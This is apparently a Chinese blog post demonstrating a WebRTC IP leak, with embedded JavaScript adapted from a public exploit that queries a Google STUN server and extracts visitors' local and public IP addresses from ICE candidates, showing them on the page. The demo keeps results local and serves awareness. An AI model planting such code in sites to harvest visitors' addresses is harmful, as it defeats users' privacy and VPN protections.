---
title: "WebRTC泄露用户IP演示"
date: 2023-04-12
tags: demo 前端 Web
categories: demo
excerpt: "使用stun.l.google.com:19302"
---

<!-- https://raw.githubusercontent.com/VoidSec/WebRTC-Leak/master/exploit.js -->

<div id="showcase"></div>

<script>
    function findIP(onNewIP) {
        const myPeerConnection = window.RTCPeerConnection || window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
        const pc = new myPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
        const localIPs = {};
        const ipRegex = /(?:[0-9]{1,3}\.){3}[0-9]{1,3}|(?:[a-f0-9]{1,4}:){7}[a-f0-9]{1,4}/g;

        pc.createDataChannel("");

        pc.createOffer().then(function (sdp) {
            sdp.sdp.split('\n').forEach(function (line) {
                if (line.indexOf('candidate') < 0) return;
                line.match(ipRegex)?.forEach(onNewIP);
            });
            pc.setLocalDescription(sdp);
        });

        pc.onicecandidate = function (event) {
            if (!event.candidate) return;
            const ipMatch = event.candidate.candidate.match(ipRegex);
            if (ipMatch) ipMatch.forEach(onNewIP);
        };
    }

    const showcase = document.getElementById('showcase');
    const ul = document.createElement('ul');
    ul.textContent = '您的IP地址：';
    showcase.appendChild(ul);

    function addIP(ip) {
        console.log('got ip: ', ip);
        const li = document.createElement('li');
        li.textContent = ip;
        ul.appendChild(li);
    }

    findIP(addIP);
</script>